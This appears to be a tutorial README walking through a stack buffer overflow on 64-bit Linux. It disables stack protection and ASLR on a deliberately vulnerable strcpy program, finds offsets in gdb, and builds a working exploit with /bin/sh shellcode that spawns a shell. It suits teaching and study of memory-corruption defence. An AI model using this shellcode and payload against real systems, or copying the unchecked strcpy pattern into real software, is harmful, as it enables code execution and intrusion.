# Stack based buffer overflow on 64 bit linux 

Let's consider this simple C code named buf.c.

```c
#include<stdio.h>
#include<string.h>
int main(int argc, char *argv[])
{
char buf[100];
strcpy(buf,argv[1]);
printf("Input was: %s\n",buf);
return 0;
}
```

### Compile
```bash
gcc -fno-stack-protector -z execstack buf.c -o buf
```
### ASLR
```bash
sudo nano /proc/sys/kernel/randomize_va_space
```
and set value to '0'.

### Test
```bash
user9747@ubuntu:~$ ./buf Hello
Input was: Hello
```

## Disassemble the Code
```bash
user9747@ubuntu:~/Desktop/bof$ gdb -q buf
Reading symbols from buf...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000001145 <+0>:	push   rbp
   0x0000000000001146 <+1>:	mov    rbp,rsp
   0x0000000000001149 <+4>:	add    rsp,0xffffffffffffff80
   0x000000000000114d <+8>:	mov    DWORD PTR [rbp-0x74],edi
   0x0000000000001150 <+11>:	mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000001154 <+15>:	mov    rax,QWORD PTR [rbp-0x80]
   0x0000000000001158 <+19>:	add    rax,0x8
   0x000000000000115c <+23>:	mov    rdx,QWORD PTR [rax]
   0x000000000000115f <+26>:	lea    rax,[rbp-0x70]
   0x0000000000001163 <+30>:	mov    rsi,rdx
   0x0000000000001166 <+33>:	mov    rdi,rax
   0x0000000000001169 <+36>:	call   0x1030 <strcpy@plt>
   0x000000000000116e <+41>:	lea    rax,[rbp-0x70]
   0x0000000000001172 <+45>:	mov    rsi,rax
   0x0000000000001175 <+48>:	lea    rdi,[rip+0xe88]        # 0x2004
   0x000000000000117c <+55>:	mov    eax,0x0
   0x0000000000001181 <+60>:	call   0x1040 <printf@plt>
   0x0000000000001186 <+65>:	mov    eax,0x0
   0x000000000000118b <+70>:	leave  
   0x000000000000118c <+71>:	ret    
End of assembler dump.
(gdb) 
```
## Stack and Virtual Addressing
![alt text](https://github.com/user9747/Buffer-Overflow-Shell-Code/blob/master/stack.png "Stack")

strcpy copies all bytes from source to destination buffer without checking the space available. If the source is larger than the space available then it will overwrite the further memory addresses including rbp and return pointer. Recall that when the function is executed the return pointer is stored on stack to return the control to next instruction after execution. Basically it contains the address for the next instruction. It means we control the contents of stack and also we can overwrite rbp and return pointer and as return pointer points to next instruction we can make cpu execute any instruction just by replacing return pointer with correct address. As we control stack we can load our instructions there and just make return address, point to it.

*We can see in disassembly that buf starts at [rbp-0x70] that is 112 bytes. The 12 bytes is alignment space here.*

**buf=100 bytes alignment=12 bytes rbp=8 bytes 6 bytes into return address. Total 126**

```bash
(gdb) r $(python -c "print 'A'*126")
Starting program: /home/ubuntu/Desktop/bof/buf $(python -c "print 'A'*126")
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
```

```bash
(gdb) info registers 
rax            0x0	0
rbx            0x0	0
rcx            0x7fffff76	2147483510
rdx            0x7ffff7dd3780	140737351858048
rsi            0x1	1
rdi            0x1	1
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7fffffffde70	0x7fffffffde70
r8             0x0	0
r9             0x8a	138
r10            0x7e	126
r11            0x246	582
r12            0x555555555060	93824992235616
r13            0x7fffffffdf40	140737488346944
r14            0x0	0
r15            0x0	0
rip            0x414141414141	0x414141414141
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
```
## Shellcode
```bash
\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
```
## Making the exploit

**payload = 'A'*76 + shellcode + 'A'*12 + 'B'*8 + return_address**

### Finding return address
```bash
(gdb) r $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")
Starting program: /home/virtual/buf $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPH1�H1�H�/bin//shST_�;AAAAAAAAAAAABBBBBBBBCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x0000434343434343 in ?? ()
```

Dump memory from rsp(stack pointer)
```bash
(gdb) x/100x $rsp-200
0x7fffffffdda8:	0x555551f0	0x00005555	0x41414141	0x41414141
0x7fffffffddb8:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffddc8:	0xf7ffe168	0x00007fff	0x00000001	0x00000000
0x7fffffffddd8:	0x55555186	0x00005555	0xffffdf48	0x00007fff
0x7fffffffdde8:	0x00000000	0x00000002	0x41414141	0x41414141
0x7fffffffddf8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffde08:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffde18:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffde28:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffde38:	0x41414141=>0xd2314850	0x48f63148	0x69622fbb
0x7fffffffde48:	0x732f2f6e	0x5f545368	0x050f3bb0	0x41414141
0x7fffffffde58:	0x41414141	0x41414141	0x42424242	0x42424242
0x7fffffffde68:	0x43434343	0x00004343	0xffffdf48	0x00007fff
0x7fffffffde78:	0xffffdf48	0x00007fff	0xf7b995c8	0x00000002
0x7fffffffde88:	0x55555145	0x00005555	0x00000000	0x00000000
0x7fffffffde98:	0x9fe9f648	0x4fb90a6c	0x55555060	0x00005555
0x7fffffffdea8:	0xffffdf40	0x00007fff	0x00000000	0x00000000
0x7fffffffdeb8:	0x00000000	0x00000000	0x8029f648	0x1aec5f39
0x7fffffffdec8:	0x9319f648	0x1aec4f83	0x00000000	0x00000000
0x7fffffffded8:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdee8:	0xffffdf60	0x00007fff	0xf7ffe168	0x00007fff
0x7fffffffdef8:	0xf7de77cb	0x00007fff	0x00000000	0x00000000
0x7fffffffdf08:	0x00000000	0x00000000	0x55555060	0x00005555
0x7fffffffdf18:	0xffffdf40	0x00007fff	0x00000000	0x00000000
0x7fffffffdf28:	0x5555508a	0x00005555	0xffffdf38	0x00007fff
(gdb)
```
return address = 0x7fffffffde3c

Device is little endian so address should be reversed in the exploit.
```bash
(gdb) r $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x3c\xde\xff\xff\xff\x7f'")
Starting program: /home/ubuntu/Desktop/bof/buf $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x3c\xde\xff\xff\xff\x7f'")
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPH1�H1�H�/bin//shST_�;AAAAAAAAAAAABBBBBBBB<����
process 3572 is executing new program: /bin/dash
$ ls
a.out  buf  buf.c  buf_shell  buf_shell.c  hack.py  howto  invoke  r.sh  test  test.c
$ whoami
ubuntu
$ pwd
/home/ubuntu/Desktop/bof
$ id
uid=999(ubuntu) gid=999(ubuntu) groups=999(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ 
```
### Running Exploit outside gdb
```bash
user9747@ubuntu:~/Desktop/bof$ /home/ubuntu/Desktop/bof/buf $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x3c\xde\xff\xff\xff\x7f'")
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPH1�H1�H�/bin//shST_�;AAAAAAAAAAAABBBBBBBB<����
$ id
uid=999(ubuntu) gid=999(ubuntu) groups=999(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ whoami 
ubuntu
$ 
```

That's it Folks we got our shell!





